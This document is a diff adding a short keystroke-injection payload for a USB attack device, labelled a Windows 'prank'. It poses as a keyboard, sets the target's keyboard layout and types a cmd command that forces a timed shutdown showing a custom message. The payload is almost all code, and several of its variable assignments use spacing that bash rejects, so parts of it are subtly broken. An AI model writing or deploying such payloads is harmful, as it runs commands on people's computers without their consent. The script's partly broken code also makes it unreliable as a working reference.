@@ -1,5 +1,4 @@
 #!/bin/bash
-
 ############################################################
 # Title: NiceShutdown					   #
 # Author: Emilius123					   #
@@ -7,7 +6,26 @@
 # Category: Prank					   #
 # Supported: Windows					   #
 # Development status: In development			   #
-# Tested: No, you can't test nothing.                      #
+# Tested: No                      			   #
 ############################################################
 
-# Configuring - You can change stuff here
+LED SETUP
+
+ATTACKMODE HID
+
+#--// Configuring - You can change stuff here -- \\--#
+ShutdownMessage = "this is truly amazing" # The message that is used for the Shutdown
+ShutdownDelay = "10" # The delay between attack and actual shutdown
+DUCKY_LANG de # Change to the target's exspected keyboard layout
+
+#--// Setting up \\--#
+ShutdownCommand="shutdown -s -t ${ShutdownDelay} -c \"${ShutdownMessage}\""
+
+#--// Shutting down \\--#
+LED ATTACK
+
+RUN WIN "cmd /c ${ShutdownCommand}"
+
+
+# We're done!
+LED FINISH
